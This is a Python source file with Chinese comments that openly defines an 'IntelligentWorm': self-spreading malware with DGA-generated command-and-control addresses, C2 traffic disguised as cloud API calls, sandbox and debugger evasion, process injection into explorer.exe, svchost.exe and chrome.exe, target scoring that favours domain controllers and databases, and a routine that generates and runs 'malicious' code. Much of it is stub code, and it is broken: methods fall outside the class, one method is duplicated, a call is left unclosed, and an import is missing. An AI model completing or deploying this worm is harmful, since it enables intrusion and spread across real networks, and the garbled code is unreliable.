#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
智能模块增强：
1. 环境感知与自适应决策
2. 动态行为变异
3. 多模式智能攻击
4. 隐蔽通信与数据加密
5. 内存驻留与无文件执行
6. 反检测与反分析
7. 机器学习辅助决策
"""

import sys
import os
import time
import random
import platform
import socket
import psutil
import json
import base64
import hashlib
import ctypes
import requests
import pickle
import numpy as np
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import inspect
import subprocess
import re
from collections import deque
from 模仿人类的思考方式 import HumanLikeThinker
from 自动写代码 import AutoCoder


class IntelligentWorm:
    def __init__(self):
        # === 核心配置 ===
        self.version = "3.0.0"
        self.magic_number = 0xDEADBEEF  # 内存标记
        self.learning_model = None
        self.behavior_history = deque(maxlen=100)  # 行为历史记录

        # === 智能基因参数 ===
        self.genome = {
            'mode': 'adaptive',  # 攻击模式
            'propagation': self._adaptive_propagation_rate(),  # 动态传播系数
            'sleep_range': self._calculate_sleep_range(),  # 智能休眠时间
            'max_attempts': 3,  # 最大重试次数
            'c2_interval': (300, 3600),  # C2通信间隔
            'obfuscation': True,  # 是否启用混淆
            'learning_rate': 0.1,  # 学习率
            'risk_tolerance': 0.5  # 风险容忍度(0-1)
        }

        # === 系统状态 ===
        self.start_time = datetime.now()
        self.execution_count = 0
        self.failed_attempts = 0
        self.c2_last_contact = 0
        self.intel_cache = None
        self.threat_level = 0  # 0-10威胁等级

        # === 安全配置 ===
        self.c2_servers = self._generate_c2_list()
        self.encryption_key = self._generate_key()
        self.iv = os.urandom(16)
        self.current_camouflage = self._select_camouflage()

        # === 模块初始化 ===
        self._load_learning_model()
        self._validate_environment()
        self._log_event("Initialized", "System startup")

        self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())


self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
self.coder = AutoCoder()  # 从自动写代码.py导入


def _load_attack_knowledge(self):
    """加载攻击相关知识库"""
    return {
        'general': {
            'firewall': ['block', 'rules', 'bypass'],
            'antivirus': ['detect', 'signature', 'evade'],
            'code_generation': ['automation', 'templates', 'compilation']
        },
        'personal': {
            'memories': ['previous attacks', 'vulnerable systems', 'generated code']
        }
    }
    # === 主运行循环 ===
    def run(self):
        """主执行循环"""
        while self.failed_attempts < self.genome['max_attempts']:
            try:
                if self._safety_checks():
                    intel = self.gather_intel(refresh=True)
                    result = self.execute_attack(intel)
                    if result:
                        self.c2_beacon(intel)
                        time.sleep(random.randint(*self.genome['sleep_range']))
                    else:
                        self.failed_attempts += 1
                else:
                    self._stealth_exit()
            except Exception as e:
                self._log_error(e)
                self.failed_attempts += 1
                time.sleep(60)
        self._self_destruct()

    # === 智能决策引擎 ===

    def _adaptive_propagation_rate(self):
        """基于环境智能调整传播系数"""
        base_rate = 0.5
        # 根据网络规模、安全级别等动态调整
        return min(base_rate + random.uniform(-0.1, 0.2), 0.9)

    def _calculate_sleep_range(self):
        """计算智能休眠时间范围"""
        min_sleep = max(600, 3600 - self.threat_level * 300)  # 威胁越高休眠越短
        max_sleep = min(86400, 7200 + self.threat_level * 600)  # 威胁越高休眠越长
        return (min_sleep, max_sleep)

    def generate_malicious_code(self, lang='c'):
        """生成恶意代码并编译"""
        thoughts = self.thinker.think_about("code_generation",
                                            f"How to generate {lang} code for attack?")
        self._log_event("CodeGen", f"Thoughts: {thoughts}")

        # 根据思考结果决定生成策略
        if any("stealth" in t.lower() for t in thoughts):
            # 生成隐蔽代码
            filename = self.coder.generate_c_code(
                function_name=f"legit_{int(time.time())}",
                params=["int argc", "char** argv"],
                return_type="int",
                body='/* benign looking code */\nsystem("malicious command");'
            )
        else:
            # 正常生成
            filename = self.coder.auto_generate_and_compile(lang)

        return filename

    def make_decision(self, context):
        """基于上下文的智能决策"""
        if self.learning_model:
            try:
                # 将上下文特征转换为模型输入
                features = self._context_to_features(context)
                prediction = self.learning_model.predict([features])[0]
                return prediction
            except Exception as e:
                self._log_error(e)

        # 默认决策逻辑
        if context.get('security_score', 0) > 3:
            return 'stealth'
        elif context.get('network_connectivity', False):
            return 'propagate'
        else:
            return 'wait'

    # === 增强的环境感知 ===

    def gather_intel(self, refresh=False):
        """增强的环境情报收集"""
        if self.intel_cache and not refresh:
            return self.intel_cache

        intel = {
            'system': self._get_system_info(),
            'network': self._get_network_info(),
            'security': self._get_security_status(),
            'users': self._get_user_activity(),
            'environment': self._get_environment_context(),
            'timestamp': datetime.now().isoformat()
        }

        # 智能价值评估
        intel['priority'] = self._assess_target_value(intel)
        intel['risk'] = self._calculate_risk(intel)

        # 更新威胁等级
        self.threat_level = min(10, intel['security']['score'] * 2 + intel['risk'] * 5)

        self.intel_cache = intel
        return intel

    def _get_environment_context(self):
        """获取环境上下文信息"""
        context = {
            'network_connectivity': self._check_network_connectivity(),
            'working_hours': self._is_working_hours(),
            'user_activity': self._get_user_activity_level(),
            'system_load': psutil.cpu_percent(interval=1)
        }
        return context

    def _assess_target_value(self, intel):
        """智能目标价值评估"""
        value = 0

        # 主机名特征
        hostname = intel['system']['hostname'].lower()
        if 'dc' in hostname or 'svr' in hostname:
            value += 3
        elif 'db' in hostname or 'sql' in hostname:
            value += 2
        elif 'dev' in hostname or 'test' in hostname:
            value -= 1

        # 系统角色
        if intel['system']['os'] == 'Windows' and 'Server' in platform.release():
            value += 2

        # 网络位置
        ips = [ip for iface in intel['network'].values() for ip in iface['ips']]
        if any(ip.startswith(('10.', '192.168.', '172.')) for ip in ips):
            value += 1

        # 安全级别反向评估(安全级别越低价值越高)
        value += (5 - intel['security']['score']) * 0.5

        return min(max(value, 1), 5)  # 1-5分级

    # === 智能攻击模块 ===

    def execute_attack(self, intel):
        """智能攻击执行"""
        strategy = self._select_attack_strategy(intel)

        try:
            self._log_event("AttackStart", f"Strategy: {strategy}")

            if strategy == 'exploit':
                return self._execute_smart_exploit(intel)
            elif strategy == 'credential':
                return self._execute_credential_attack(intel)
            elif strategy == 'lateral':
                return self._execute_lateral_movement(intel)
            else:
                return self._execute_adaptive_attack(intel)

        except Exception as e:
            self._log_error(e)
            return False

    def _execute_smart_exploit(self, intel):
        """智能漏洞利用"""
        # 基于收集的情报选择最合适的漏洞
        os_info = intel['system']
        vulns = self._get_relevant_vulns(os_info)

        if not vulns:
            return False

        # 根据成功率、隐蔽性等因素选择最佳漏洞
        selected_vuln = self._select_optimal_vuln(vulns)
        return self._launch_exploit(selected_vuln)

    def _select_optimal_vuln(self, vulns):
        """选择最优漏洞"""
        # 简单实现 - 实际中可以使用更复杂的决策逻辑
        return max(vulns, key=lambda x: x.get('success_rate', 0) - x.get('detection_rate', 0))

    # === 智能通信模块 ===

    def c2_beacon(self, data=None):
        """智能隐蔽通信"""
        if not self._should_communicate():
            return False

        payload = self._prepare_payload(data)
        encrypted = self._encrypt(json.dumps(payload))

        # 动态选择通信渠道
        channel = self._select_communication_channel()
        response = self._send_data(encrypted, channel)

        if response:
            self._process_response(response)
            return True
        return False

    def _select_communication_channel(self):
        """改进的通信渠道选择，模仿合法云服务"""
        cloud_apis = [
            ('aws', "https://dynamodb.{region}.amazonaws.com", 0.8),
            ('azure', "https://{region}.blob.core.windows.net", 0.7),
            ('gcp', "https://storage.googleapis.com", 0.6)
        ]

        # 动态生成请求参数模仿正常API调用
        region = random.choice(['us-east-1', 'eu-west-1', 'ap-southeast-1'])
        service, base_url, weight = random.choices(cloud_apis, weights=[x[2] for x in cloud_apis])[0]
        url = base_url.format(region=region) + f"/v1/{random.randint(1000, 9999)}"

        return {
            'url': url,
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json'
            }
        }

    # === 反检测增强 ===

    def _safety_checks(self):
        """增强的安全检查"""
        checks = [
            self._is_debugged(),
            self._is_sandboxed(),
            self._is_monitored(),
            self._has_anomalies()
        ]

        if any(checks):
            self._evade_detection()
            return False
        return True

    def _is_monitored(self):
        """检测监控状态"""
        # 检查进程注入、API hook等
        return False

    def _has_anomalies(self):
        """检测行为异常"""
        # 分析当前行为模式是否偏离正常
        return False

    def _load_learning_model(self):
        """改进的模型加载方式，防止指纹识别"""
        model_fragments = [
            'model_fragment_1.pkl',
            'model_fragment_2.pkl',
            'model_fragment_3.pkl'
        ]

        self.learning_model = {}
        for fragment in random.sample(model_fragments, 2):  # 只加载部分模块
            with open(fragment, 'rb') as f:
                self.learning_model[fragment] = pickle.load(f)

        # 添加随机噪声干扰特征分析
        for layer in self.learning_model.values():
            if hasattr(layer, 'weights'):
                layer.weights = [w * random.uniform(0.9, 1.1) for w in layer.weights]

    # === 智能学习模块 ===

    def _load_learning_model(self):
        """改进的模型加载方式，防止指纹识别"""
        model_fragments = [
            'model_fragment_1.pkl',
            'model_fragment_2.pkl',
            'model_fragment_3.pkl'
        ]

        self.learning_model = {}
        for fragment in random.sample(model_fragments, 2):  # 只加载部分模块
            with open(fragment, 'rb') as f:
                self.learning_model[fragment] = pickle.load(f)

        # 添加随机噪声干扰特征分析
        for layer in self.learning_model.values():
            if hasattr(layer, 'weights'):
                layer.weights = [w * random.uniform(0.9, 1.1) for w in layer.weights]
                _evade_detection(
    def update_model(self, new_data):
        """在线更新学习模型"""
        if not self.learning_model:
            return

        try:
            # 转换数据格式
            X, y = self._prepare_training_data(new_data)

            # 部分拟合新数据
            self.learning_model.partial_fit(X, y)

            # 保存更新后的模型
            model_path = self._get_model_path()
            with open(model_path, 'wb') as f:
                pickle.dump(self.learning_model, f)

        except Exception as e:
            self._log_error(e)

    # === 工具方法 ===

    def _log_event(self, event_type, message):
        """记录事件日志"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            'time': timestamp,
            'type': event_type,
            'message': message,
            'threat_level': self.threat_level
        }
        self.behavior_history.append(log_entry)

    def _generate_c2_list(self):
        """使用DGA生成动态C2地址"""

        def dga(seed):
            random.seed(seed)
            tlds = ['.com', '.net', '.org']
            return f"{''.join(random.sample('abcdefghijklmnopqrstuvwxyz', 12))}{random.choice(tlds)}"

        daily_seed = datetime.now().strftime("%Y%m%d")
        return [
            f"https://api.{dga(daily_seed + str(i))}/v1/query"
            for i in range(3)
        ]
    def _select_camouflage(self):
        """选择当前伪装身份"""
        personas = [
            {'name': 'chrome', 'process': 'chrome.exe', 'ports': [80, 443]},
            {'name': 'teams', 'process': 'teams.exe', 'ports': [443, 3478]},
            {'name': 'svchost', 'process': 'svchost.exe', 'ports': [135, 445]}
        ]
        return random.choice(personas)

    # === 其他必要方法 ===
    def _validate_environment(self):
        """改进的环境适配检查"""
        env_adapters = {
            'windows': self._windows_adaptation,
            'linux': self._linux_adaptation,
            'docker': self._container_adaptation
        }

        current_env = self._detect_environment()
        env_adapters.get(current_env, self._default_adaptation)()

    # 改进方案：
    # 进程注入：寄生在合法进程中
    # 无文件攻击：完全内存操作
    # 内核级隐藏：通过驱动隐藏痕迹
    def _memory_injection(self):
        """改进的内存驻留技术"""
        target_processes = ['explorer.exe', 'svchost.exe', 'chrome.exe']
        for proc in psutil.process_iter():
            if proc.name().lower() in target_processes:
                try:
                    # 使用进程空洞技术注入
                    handle = ctypes.windll.kernel32.OpenProcess(
                        0x1F0FFF, False, proc.pid)
                    ctypes.windll.kernel32.VirtualAllocEx(
                        handle, 0, len(self.code),
                        0x3000, 0x40)
                    # 写入并执行代码...
                    break
                except:
                    continue

    # 增强加密抗破解
    def _encrypt(self, data):
        """改进的混合加密方案"""
        # 每次生成临时RSA密钥对
        temp_key = RSA.generate(2048)
        encrypted_key = temp_key.publickey().encrypt(self.encryption_key, 32)[0]

        # 使用临时AES密钥加密数据
        cipher = AES.new(os.urandom(32), AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())

        # 将加密数据伪装成TLS记录
        return {
            'tls_version': '1.3',
            'cipher_suite': 'TLS_AES_256_GCM_SHA384',
            'payload': base64.b64encode(encrypted_key + cipher.nonce + tag + ciphertext)
        }

    def _detect_environment(self):
        """精确环境检测"""
        if 'docker' in os.environ.get('HOSTNAME', ''):
            return 'docker'
        elif 'linux' in sys.platform.lower():
            return 'linux'
        else:
            return 'windows'

    def _log_error(self, error):
        """记录错误"""
        pass

    def _stealth_exit(self):
        """隐蔽退出"""
        sys.exit(0)

    def _self_destruct(self):
        """自毁清理"""
        sys.exit(0)

    def _should_communicate(self):
        """判断是否应该通信"""
        return True

    def _prepare_payload(self, data):
        """准备通信负载"""
        return data or {}

    def _send_data(self, data, channel):
        """发送数据"""
        return True

    def _process_response(self, response):
        """处理响应"""
        pass

    def _context_to_features(self, context):
        """转换上下文为特征"""
        return []

    def _get_model_path(self):
        """获取模型路径"""
        return ""

    def _prepare_training_data(self, data):
        """准备训练数据"""
        return [], []

    def _change_behavior_pattern(self):
        """改变行为模式"""
        pass

    def _switch_camouflage(self):
        """切换伪装"""
        pass

    def _reduce_activity(self):
        """减少活动"""
        pass

    def _sleep_random_time(self):
        """随机休眠"""
        pass

    def _check_network_connectivity(self):
        """检查网络连接"""
        return True

    def _is_working_hours(self):
        """是否工作时间"""
        return True

    def _get_user_activity_level(self):
        """获取用户活动级别"""
        return 0

    def _get_system_info(self):
        """获取系统信息"""
        return {}

    def _get_network_info(self):
        """获取网络信息"""
        return {}

    def _get_security_status(self):
        """获取安全状态"""
        return {'score': 0}

    def _get_user_activity(self):
        """获取用户活动"""
        return {}

    def _calculate_risk(self, intel):
        """计算风险"""
        return 0


def _select_attack_strategy(self, intel):
    """增强版攻击策略选择"""
    # 获取思考者的情感状态
    emotional_state = self.thinker.emotional_state

    # 情感影响决策
    if emotional_state['fear'] > 0.7:
        return 'stealth'
    elif emotional_state['happiness'] > 0.6:
        return 'aggressive'

    # 个性特征影响
    if self.thinker.personality['agreeableness'] < 0.4:
        return 'destructive'

    # 默认逻辑
    return super()._select_attack_strategy(intel)

    def _get_relevant_vulns(self, os_info):
        """获取相关漏洞"""
        return []

    def _launch_exploit(self, vuln):
        """发起漏洞利用"""
        return True

    def _execute_credential_attack(self, intel):
        """执行凭据攻击"""
        return True

    def _execute_lateral_movement(self, intel):
        """执行横向移动"""
        return True

    def _execute_adaptive_attack(self, intel):
        """执行自适应攻击 - 现在包含代码生成"""
        # 1. 人类化思考决策
        question = f"What attack strategy for {intel['system']['hostname']}?"
        thoughts = self.thinker.think_about("attack_strategy", question)

        # 2. 根据思考结果选择行动
        if "code" in ' '.join(thoughts).lower():
            lang = random.choice(['c', 'cpp', 'java'])
            code_file = self.generate_malicious_code(lang)
            return self._execute_generated_code(code_file)
        else:
            return super()._execute_adaptive_attack(intel)

    def _execute_generated_code(self, filename):
        """执行生成的代码"""
        try:
            if filename.endswith('.c') or filename.endswith('.cpp'):
                subprocess.run([filename], check=True)
                return True
            elif filename.endswith('.java'):
                subprocess.run(['java', filename], check=True)
                return True
        except subprocess.CalledProcessError as e:
            self._log_error(e)
            return False

# === 执行入口 ===
if __name__ == '__main__':
    try:
        worm = IntelligentWorm()
        worm.run()
    except KeyboardInterrupt:
        worm._stealth_exit()
    except Exception as e:
        worm._log_error(e)
        worm._self_destruct()